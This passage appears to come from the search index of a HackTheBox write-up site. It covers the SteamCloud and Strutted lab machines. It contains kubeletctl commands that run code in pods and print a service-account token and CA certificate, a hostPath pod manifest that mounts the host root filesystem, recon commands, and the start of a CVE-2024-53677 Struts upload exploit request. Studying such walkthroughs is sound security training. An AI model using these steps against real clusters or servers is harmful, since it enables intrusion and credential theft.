\u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 2 \u2502 kube-scheduler-steamcloud          \u2502 kube-system \u2502 kube-scheduler          \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 3 \u2502 etcd-steamcloud                    \u2502 kube-system \u2502 etcd                    \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 4 \u2502 kube-apiserver-steamcloud          \u2502 kube-system \u2502 kube-apiserver          \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 5 \u2502 storage-provisioner                \u2502 kube-system \u2502 storage-provisioner     \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 6 \u2502 kube-proxy-k8tsh                   \u2502 kube-system \u2502 kube-proxy              \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 7 \u2502 coredns-78fcd69978-xgmt7           \u2502 kube-system \u2502 coredns                 \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 8 \u2502 nginx                              \u2502 default     \u2502 nginx                   \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u2514\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 scan --help\nDescription:\n  Scans for nodes with opened kubelet's API.\n\n  Examples:\n    // It will find all nodes that have opened kubelet API\n    kubeletctl scan --cidr \"123.123.123.123/24\"\n\nUsage:\n  kubeletctl scan [flags]\n  kubeletctl scan [command]\n\nAvailable Commands:\n  rce         Scans for nodes with opened kubelet API\n  token       Scans for for all the tokens in a given Node.\n\nFlags:\n  -h, --help   help for scan\n\nGlobal Flags:\n      --cacert string       CA certificate (example: /etc/kubernetes/pki/ca.crt )\n      --cert string         Private key (example: /var/lib/kubelet/pki/kubelet-client-current.pem)\n      --cidr string         A network of IP addresses (Example: x.x.x.x/24)\n  -k, --config string       KubeConfig file\n  -c, --container string    Container name\n      --http                Use HTTP (default is HTTPS)\n  -i, --ignoreconfig        Ignore the default KUBECONFIG environment variable or location ~/.kube\n      --key string          Digital certificate (example: /var/lib/kubelet/pki/kubelet-client-current.pem)\n  -n, --namespace string    pod namespace\n  -p, --pod string          Pod name\n      --port string         Kubelet's port, default is 10250\n  -r, --raw                 Prints raw data\n  -s, --server string       Server address (format: x.x.x.x. For Example: 123.123.123.123)\n  -t, --token string        Service account Token (JWT) to insert\n  -f, --token-file string   Service account Token (JWT) file path\n  -u, --uid string          Pod UID\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 scan rce   \n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                   Node with pods vulnerable to RCE                                  \u2502\n\u251c\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   \u2502 NODE IP      \u2502 PODS                               \u2502 NAMESPACE   \u2502 CONTAINERS              \u2502 RCE \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   \u2502              \u2502                                    \u2502             \u2502                         \u2502 RUN \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 1 \u2502 10.10.11.133 \u2502 kube-apiserver-steamcloud          \u2502 kube-system \u2502 kube-apiserver          \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 2 \u2502              \u2502 storage-provisioner                \u2502 kube-system \u2502 storage-provisioner     \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 3 \u2502              \u2502 kube-proxy-k8tsh                   \u2502 kube-system \u2502 kube-proxy              \u2502 +   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 4 \u2502              \u2502 coredns-78fcd69978-xgmt7           \u2502 kube-system \u2502 coredns                 \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 5 \u2502              \u2502 nginx                              \u2502 default     \u2502 nginx                   \u2502 +   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 6 \u2502              \u2502 kube-controller-manager-steamcloud \u2502 kube-system \u2502 kube-controller-manager \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 7 \u2502              \u2502 kube-scheduler-steamcloud          \u2502 kube-system \u2502 kube-scheduler          \u2502 -   \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 8 \u2502              \u2502 etcd-steamcloud                    \u2502 kube-system \u2502 etcd                    \u2502 -   \u2502\n\u2514\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>nginx and kube-proxy-k8tsh pods can execute code remotely, but kube-proxy-k8tsh is a pod for proxy.</p> <pre><code>\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'ls -la /var/run/secrets/kubernetes.io/serviceaccount/' -p nginx -c nginx\ntotal 4\ndrwxrwxrwt 3 root root  140 Feb 21 07:20 .\ndrwxr-xr-x 3 root root 4096 Feb 21 07:20 ..\ndrwxr-xr-x 2 root root  100 Feb 21 07:20 ..2024_02_21_07_20_02.874347555\nlrwxrwxrwx 1 root root   31 Feb 21 07:20 ..data -&gt; ..2024_02_21_07_20_02.874347555\nlrwxrwxrwx 1 root root   13 Feb 21 07:20 ca.crt -&gt; ..data/ca.crt\nlrwxrwxrwx 1 root root   16 Feb 21 07:20 namespace -&gt; ..data/namespace\nlrwxrwxrwx 1 root root   12 Feb 21 07:20 token -&gt; ..data/token\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' -p nginx -c nginx\neyJhbGciOiJSUzI1NiIsImtpZCI6IkNUUVE2ZFV6NXNoZEtWTGdYRDNQRU1FWXBnQ2RuQnBhZUo4YkNhelNrQVEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQwMDM2MDAyLCJpYXQiOjE3MDg1MDAwMDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjJiMTk1Yjk2LWNiMTEtNDIyZi1iZDIwLTdlYTcyOTE3MmE5YSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImU5NGVhYjcwLWJkMDctNDkyMS05YWE2LWRlMWUyZDYyNGIxMSJ9LCJ3YXJuYWZ0ZXIiOjE3MDg1MDM2MDl9LCJuYmYiOjE3MDg1MDAwMDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.nNVM9EnSiwvvFEB5BM9T5IDpn3aFagsOMoWt_xVQRSfyHNmereRX_g8zgKBZg920LI-M9u-UgORmY1VnfboOUfh-J_kykUSgnOA1hBA9suStwGPZxBEVU4tWwQ7lDZWLKFNdLsizovMo4wg90M3JdkQCl5q-MjVVAjwLLRwoLs2_3W5YcVqzFvKUeBx2300zbFmhgi6WWZIt6QLI0nw4rXo7zMTzgC4-kptvxX_HYFGxzR9eti-xV0QtAdH5uaaSKtUP8ZVRF4j4mu3ctPuImybkKYS_5_5kif_YQ0uPN63Yj5_9BTr1KISYBGIYGz6gC8vV2bwXr1qd6B-CiPiWAw\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt' -p nginx -c nginx\n-----BEGIN CERTIFICATE-----\nMIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p\na3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE\nAxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa\nYRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M\nHLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7\ndeqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG\nVeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll\nhnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o\n1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW\nMBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW\nBBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm\nlt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO\nDGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+\n9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D\nxpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0\nJWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz\nkf2eZIBNMp0TFg==\n-----END CERTIFICATE-----\n</code></pre> <pre><code>\u2514\u2500$ sudo kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 auth can-i --list\nResources                                       Non-Resource URLs                     Resource Names   Verbs\nselfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]\npods                                            []                                    []               [get create list]\n                                                [/.well-known/openid-configuration]   []               [get]\n                                                [/api/*]                              []               [get]\n                                                [/api]                                []               [get]\n                                                [/apis/*]                             []               [get]\n                                                [/apis]                               []               [get]\n                                                [/healthz]                            []               [get]\n                                                [/healthz]                            []               [get]\n                                                [/livez]                              []               [get]\n                                                [/livez]                              []               [get]\n                                                [/openapi/*]                          []               [get]\n                                                [/openapi]                            []               [get]\n                                                [/openid/v1/jwks]                     []               [get]\n                                                [/readyz]                             []               [get]\n                                                [/readyz]                             []               [get]\n                                                [/version/]                           []               [get]\n                                                [/version/]                           []               [get]\n                                                [/version]                            []               [get]\n                                                [/version]                            []               [get]\n\n</code></pre>"}, {"location": "HTB/Machines/SteamCloud/#yaml-file-used-to-deploy-a-new-pod", "title": ".yaml file used to deploy a new pod", "text": "<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginxt\n  namespace: default\nspec:\n  containers:\n  - name: nginxt\n    image: nginx:1.14.2\n    volumeMounts:\n    - mountPath: /root\n      name: mount-root-into-mnt\n  volumes:\n  - name: mount-root-into-mnt\n    hostPath:\n      path: /\n  automountServiceAccountToken: true\n  hostNetwork: true\n</code></pre> <pre><code>\u2514\u2500$ sudo kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 apply -f deploy.yaml \npod/nginxt created\n\n\u2514\u2500$ sudo kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods\nNAME     READY   STATUS    RESTARTS   AGE\nnginx    1/1     Running   0          73m\nnginxt   1/1     Running   0          59s\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'ls /root' -p nginxt -c nginxt\n\n</code></pre> <pre><code>\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /root/home/user/user.txt' -p nginxt -c nginxt\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 exec 'cat /root/root/root.txt' -p nginxt -c nginxt\n</code></pre>"}, {"location": "HTB/Machines/Strutted/", "title": "Strutted", "text": ""}, {"location": "HTB/Machines/Strutted/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 10.10.11.59 -p- --min-rate=10000 -T4 -sCV\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://strutted.htb/\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "HTB/Machines/Strutted/#web-app", "title": "Web APP", "text": "<pre><code>echo \"10.10.11.59 strutted.htb\" | sudo tee -a /etc/hosts\n\ngobuster dir -u http://strutted.htb/ -w /usr/share/wordlists/dirb/common.txt --exclude-length 5197\n\n</code></pre>"}, {"location": "HTB/Machines/Strutted/#cve-2024-53677", "title": "CVE-2024-53677", "text": "<p>Understanding Apache Struts 2 CVE-2024-53677</p> <p>CVE-2024-53677 is a critical file upload vulnerability in the default Interceptor class (FileUploadInterceptor) of Struts 2; this vulnerability has some similarities to CVE-2023-50164 from December 2023 \u2013 Struts, like many popular frameworks, is the gift that keeps on giving. An attacker could exploit this vulnerability by sending specially crafted upload parameters, bypassing path traversal protections and uploading malicious files, leading to Remote Code Execution.</p> <p>Despite the vulnerable FileUploadInterceptor object shipping as part of the default Interceptor stack in all currently available versions of Struts 2, the extensible nature of Struts 2 does not require developers to implement the functionality for uploading files. This means that not all applications which leverage Struts 2 are vulnerable.</p> <p>The good news is that a vulnerable version of Struts 2 is only exploitable if the application has implemented the FileUploadInterceptor. Unfortunately, detecting use of these components and mitigating the vulnerability requires manual investigation of the application or coordination with the vendor or developers who created it.</p> <pre><code>POST /upload.action HTTP/1.1\nHost: strutted.htb\nContent-Length: 3105\nCache-Control: max-age=0\nAccept-Language: en-US,en;q=0.9\nOrigin: http://strutted.htb\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarycLZsu5h63A9JgavD\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://strutted.htb/upload.action\nAccept-Encoding: gzip, deflate, br\nCookie: JSESSIONID=14AB362282C6804E033E2279B401DADE\nConnection: keep-alive\n\n------WebKitFormBoundarycLZsu5h63A9JgavD\nContent-Disposition: form-data; name=\"Upload\"; filename=\"sample.jpg\"\nContent-Type: 